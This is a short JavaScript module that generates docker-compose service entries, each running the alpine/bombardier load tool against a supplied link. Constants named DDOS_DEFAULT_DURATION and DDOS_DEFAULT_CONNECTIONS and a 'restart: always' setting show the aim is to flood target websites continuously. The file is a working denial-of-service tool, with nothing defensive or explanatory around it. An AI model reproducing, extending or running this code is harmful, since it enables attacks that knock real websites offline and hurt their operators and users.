import { DDOS_DEFAULT_DURATION, DDOS_DEFAULT_CONNECTIONS } from '../constants/DEFAULT_VALUES.js'

export function generateContainerItem (item) {
    let link, duration, connections
    if (typeof item === "string") {
        link = item;
        duration = DDOS_DEFAULT_DURATION;
        connections = DDOS_DEFAULT_CONNECTIONS;
    } else if (typeof item === "object" && item.link) {
        link = item.link;
        duration = item.duration || DDOS_DEFAULT_DURATION;
        connections = item.connections || DDOS_DEFAULT_CONNECTIONS;
    }
    return '\n' +
        `  ${link}:\n` +
        `    container_name: ${link}\n` +
        `    image: alpine/bombardier\n` +
        `    restart: always\n` +
        `    command: -c ${connections} -d ${duration} -l ${link}` +
        '\n'
}